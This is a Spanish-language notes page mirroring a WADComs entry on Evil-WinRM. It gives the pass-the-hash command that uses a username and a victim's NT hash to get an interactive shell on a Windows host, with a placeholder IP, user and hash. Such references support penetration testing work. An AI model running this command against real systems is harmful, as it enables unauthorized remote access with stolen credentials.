# WADComs: Evil-WinRM-PTH

[[00-inicio|Inicio]] · [[Referencias|Referencias]] · [[WADComs|Índice WADComs]]

> Fuente: [https://wadcoms.github.io/](https://wadcoms.github.io/) · Licencia: **GPL-3.0** · Espejo local generado desde el repositorio oficial.

WADComs — comandos para Active Directory, ordenados por lo que TENES.

**Lo que tenés:** `Username`, `Hash`

**Sistema:** `Linux`, `Windows`

## Descripción

Evil-WinRM uses the Windows Management Instrumentation (WMI) to give you an interactive shell on the Windows host. Evil-WinRM supports passing the victim's NT hash for authorization.

Command Reference:

	Target IP: 10.10.10.1

	Username: john

	NT Hash: c23b2e293fa0d312de6f59fd6d58eae3

## Comando

```bash
evil-winrm -i 10.10.10.1 -u john -H c23b2e293fa0d312de6f59fd6d58eae3
```

## Referencias

- https://github.com/Hackplayers/evil-winrm
